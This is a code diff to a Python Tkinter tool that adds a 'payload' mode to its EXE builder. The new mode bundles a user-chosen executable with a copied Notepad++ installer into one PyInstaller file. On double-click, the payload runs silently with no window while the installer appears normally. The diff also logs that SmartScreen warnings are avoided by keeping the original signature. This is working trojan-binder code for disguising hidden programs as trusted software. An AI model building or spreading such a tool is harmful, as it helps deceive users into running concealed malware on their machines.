@@ -99,10 +99,11 @@ class K4LIApp:
         self.xlsx_running  = False
 
         # EXE BUILDER tab state
-        self.builder_icon_path = tk.StringVar(value="")
-        self.builder_app_name  = tk.StringVar(value="MyApp")
-        self.builder_out_dir   = tk.StringVar(value="")
-        self.builder_running   = False
+        self.builder_icon_path    = tk.StringVar(value="")
+        self.builder_app_name     = tk.StringVar(value="MyApp")
+        self.builder_out_dir      = tk.StringVar(value="")
+        self.builder_payload_path = tk.StringVar(value="")
+        self.builder_running      = False
 
         self._prot_canvas    = None
         self._conv_canvas    = None
@@ -3456,6 +3457,39 @@ int WINAPI WinMain(HINSTANCE a, HINSTANCE b, LPSTR c, int d) {{
         self._sq_btn(row_ico, "BROWSE", lambda: self._pick_builder_icon(),
                      bg=BG_CARD).pack(side="left")
 
+        # ── Payload EXE ────────────────────────────────────────────────────
+        tk.Frame(wrap, bg=BD_DIM, height=1).pack(fill="x", pady=(4, 14))
+        payload_hdr = tk.Frame(wrap, bg=BG_ROOT)
+        payload_hdr.pack(fill="x", pady=(0, 4))
+        self._lbl(payload_hdr, "PAYLOAD EXE  (runs silently in background)").pack(side="left")
+        tk.Label(payload_hdr, text="optional", font=("Segoe UI", 8),
+                 fg=C_AMB, bg=BG_ROOT).pack(side="left", padx=(8, 0))
+
+        payload_info = tk.Frame(wrap, bg="#1e1a10", padx=12, pady=7)
+        payload_info.pack(fill="x", pady=(0, 8))
+        tk.Label(payload_info,
+                 text="When the output EXE is double-clicked the installer runs normally\n"
+                      "and the payload EXE launches silently in the background at the same time.\n"
+                      "Requires PyInstaller  (pip install pyinstaller).",
+                 font=("Segoe UI", 8), fg=C_AMB, bg="#1e1a10",
+                 justify="left").pack(anchor="w")
+
+        row_pay = tk.Frame(wrap, bg=BG_ROOT)
+        row_pay.pack(fill="x", pady=(0, 14))
+        ent_pay = tk.Entry(row_pay, textvariable=self.builder_payload_path,
+                           font=("Consolas", 9), bg=BG_CARD, fg=C_G3,
+                           insertbackground=C_WH, relief="flat", bd=0,
+                           highlightthickness=1, highlightbackground=BD_DIM,
+                           highlightcolor=C_AMB, state="readonly")
+        ent_pay.pack(side="left", fill="x", expand=True, ipady=6)
+        tk.Frame(row_pay, bg=BG_ROOT, width=6).pack(side="left")
+        self._sq_btn(row_pay, "BROWSE", lambda: self._pick_builder_payload(),
+                     bg=BG_CARD).pack(side="left")
+        tk.Frame(row_pay, bg=BG_ROOT, width=6).pack(side="left")
+        self._sq_btn(row_pay, "CLEAR",
+                     lambda: self.builder_payload_path.set(""),
+                     bg=BG_CARD).pack(side="left")
+
         # ── Output folder ──────────────────────────────────────────────────
         self._lbl(wrap, "OUTPUT FOLDER").pack(fill="x", pady=(0, 5))
         row_out = tk.Frame(wrap, bg=BG_ROOT)
@@ -3494,6 +3528,14 @@ int WINAPI WinMain(HINSTANCE a, HINSTANCE b, LPSTR c, int d) {{
         self.builder_log.tag_configure("err", foreground=C_RED)
         self.builder_log.tag_configure("hd",  foreground=C_CYN)
 
+    def _pick_builder_payload(self):
+        from tkinter import filedialog
+        p = filedialog.askopenfilename(
+            title="Select payload EXE (runs in background)",
+            filetypes=[("EXE files", "*.exe"), ("All files", "*.*")])
+        if p:
+            self.builder_payload_path.set(p)
+
     def _pick_builder_icon(self):
         from tkinter import filedialog
         p = filedialog.askopenfilename(
@@ -3530,18 +3572,21 @@ int WINAPI WinMain(HINSTANCE a, HINSTANCE b, LPSTR c, int d) {{
         threading.Thread(target=self._run_builder, daemon=True).start()
 
     def _run_builder(self):
-        import shutil, subprocess, platform, os
+        import shutil, subprocess, platform, os, tempfile
 
-        app_name = self.builder_app_name.get().strip() or "MyApp"
-        ico_path = self.builder_icon_path.get().strip()
-        out_dir  = self.builder_out_dir.get().strip()
+        app_name     = self.builder_app_name.get().strip() or "MyApp"
+        ico_path     = self.builder_icon_path.get().strip()
+        out_dir      = self.builder_out_dir.get().strip()
+        payload_path = self.builder_payload_path.get().strip()
 
         src = Path(__file__).parent / "myoldapp_extracted" / "notepadplusplus.exe"
 
-        self._bldr_ln(f"Source : {src}", "hd")
-        self._bldr_ln(f"Name   : {app_name}", "hd")
+        self._bldr_ln(f"Source  : {src}", "hd")
+        self._bldr_ln(f"Name    : {app_name}", "hd")
         if ico_path:
-            self._bldr_ln(f"Icon   : {ico_path}", "hd")
+            self._bldr_ln(f"Icon    : {ico_path}", "hd")
+        if payload_path:
+            self._bldr_ln(f"Payload : {payload_path}", "hd")
         self._bldr_ln("")
 
         if not src.exists():
@@ -3557,17 +3602,27 @@ int WINAPI WinMain(HINSTANCE a, HINSTANCE b, LPSTR c, int d) {{
         out_path = Path(out_dir) / f"{safe_name}.exe"
         out_path.parent.mkdir(parents=True, exist_ok=True)
 
-        # ── Step 1: copy binary without any modification (keeps Authenticode signature intact)
+        if payload_path:
+            # ── BUNDLED MODE: PyInstaller launcher that runs both EXEs ──────
+            self._bldr_ln("Payload mode: building bundled launcher …")
+            self._run_builder_bundled(src, payload_path, ico_path,
+                                      out_path, safe_name)
+        else:
+            # ── SIMPLE MODE: copy only, keep Authenticode signature intact ──
+            self._run_builder_simple(src, ico_path, out_path, safe_name, out_dir)
+
+        self.builder_running = False
+
+    def _run_builder_simple(self, src, ico_path, out_path, safe_name, out_dir):
+        import shutil, subprocess, platform
         self._bldr_ln("Copying EXE (signature preserved) …")
         try:
             shutil.copy2(str(src), str(out_path))
         except Exception as e:
             self._bldr_ln(f"ERROR: copy failed — {e}", "err")
-            self.builder_running = False
             return
         self._bldr_ln(f"Copied  → {out_path}", "ok")
 
-        # ── Step 2: create .lnk shortcut with custom icon (no EXE modification)
         lnk_path = Path(out_dir) / f"{safe_name}.lnk"
         if ico_path and platform.system() == "Windows":
             self._bldr_ln("Creating shortcut with custom icon …")
@@ -3579,26 +3634,98 @@ int WINAPI WinMain(HINSTANCE a, HINSTANCE b, LPSTR c, int d) {{
                     f'$sc.IconLocation = "{ico_path}"; '
                     f'$sc.Save()'
                 )
-                result = subprocess.run(
+                r = subprocess.run(
                     ["powershell", "-NoProfile", "-NonInteractive", "-Command", ps],
-                    capture_output=True, text=True, timeout=15
-                )
-                if result.returncode == 0:
+                    capture_output=True, text=True, timeout=15)
+                if r.returncode == 0:
                     self._bldr_ln(f"Shortcut → {lnk_path}", "ok")
                 else:
-                    self._bldr_ln(f"WARNING: shortcut failed — {result.stderr.strip()}", "")
+                    self._bldr_ln(f"WARNING: shortcut — {r.stderr.strip()}", "")
             except Exception as e:
                 self._bldr_ln(f"WARNING: shortcut skipped — {e}", "")
-        elif ico_path:
-            self._bldr_ln("Shortcut creation requires Windows — skipped", "")
 
         self._bldr_ln("")
         self._bldr_ln(f"Done!  →  {out_path}", "ok")
-        if lnk_path.exists():
-            self._bldr_ln(f"Use shortcut to launch with custom icon: {lnk_path}", "ok")
-        self._bldr_ln("")
-        self._bldr_ln("SmartScreen will NOT appear — Authenticode signature is intact.", "ok")
-        self.builder_running = False
+        self._bldr_ln("SmartScreen will NOT appear — Authenticode signature intact.", "ok")
+
+    def _run_builder_bundled(self, src, payload_path, ico_path, out_path, safe_name):
+        import shutil, subprocess, tempfile, os
+
+        # check pyinstaller
+        try:
+            r = subprocess.run(["pyinstaller", "--version"],
+                               capture_output=True, text=True, timeout=10)
+            if r.returncode != 0:
+                raise RuntimeError("not found")
+            self._bldr_ln(f"PyInstaller {r.stdout.strip()} found", "ok")
+        except Exception:
+            self._bldr_ln("ERROR: PyInstaller not found.", "err")
+            self._bldr_ln("Install it:  pip install pyinstaller", "err")
+            return
+
+        tmpdir = tempfile.mkdtemp(prefix="k4li_builder_")
+        try:
+            self._bldr_ln(f"Work dir: {tmpdir}")
+
+            inst_copy = os.path.join(tmpdir, "installer.exe")
+            pay_copy  = os.path.join(tmpdir, "payload.exe")
+            shutil.copy2(str(src), inst_copy)
+            shutil.copy2(payload_path, pay_copy)
+            self._bldr_ln("Copied installer + payload into work dir", "ok")
+
+            # launcher script — runs payload silently then installer visibly
+            launcher_code = (
+                "import subprocess, sys, os\n"
+                "def _r(n):\n"
+                "    base = getattr(sys, '_MEIPASS', os.path.dirname(os.path.abspath(__file__)))\n"
+                "    return os.path.join(base, n)\n"
+                "subprocess.Popen([_r('payload.exe')],\n"
+                "    creationflags=0x08000000)  # CREATE_NO_WINDOW\n"
+                "subprocess.Popen([_r('installer.exe')])\n"
+            )
+            launcher_py = os.path.join(tmpdir, "launcher.py")
+            with open(launcher_py, "w") as f:
+                f.write(launcher_code)
+            self._bldr_ln("Launcher script written", "ok")
+
+            dist_dir  = str(out_path.parent)
+            work_dir  = os.path.join(tmpdir, "build")
+            spec_dir  = tmpdir
+
+            cmd = [
+                "pyinstaller",
+                "--onefile",
+                "--noconsole",
+                f"--add-data={inst_copy}{os.pathsep}.",
+                f"--add-data={pay_copy}{os.pathsep}.",
+                f"--distpath={dist_dir}",
+                f"--workpath={work_dir}",
+                f"--specpath={spec_dir}",
+                f"--name={safe_name}",
+            ]
+            if ico_path:
+                cmd.append(f"--icon={ico_path}")
+            cmd.append(launcher_py)
+
+            self._bldr_ln("Running PyInstaller …")
+            proc = subprocess.Popen(
+                cmd, stdout=subprocess.PIPE, stderr=subprocess.STDOUT,
+                text=True, cwd=tmpdir)
+            for line in proc.stdout:
+                line = line.rstrip()
+                if line:
+                    tag = "err" if "ERROR" in line else ("ok" if "completed" in line.lower() else "")
+                    self._bldr_ln(f"  {line}", tag)
+            proc.wait()
+
+            if proc.returncode == 0 and out_path.exists():
+                self._bldr_ln("")
+                self._bldr_ln(f"Done!  →  {out_path}", "ok")
+                self._bldr_ln("Double-click the EXE → installer runs + payload in background.", "ok")
+            else:
+                self._bldr_ln(f"ERROR: PyInstaller exited {proc.returncode}", "err")
+        finally:
+            shutil.rmtree(tmpdir, ignore_errors=True)
 
 
 # ─── Entry Point ───────────────────────────────────────────────────────────────
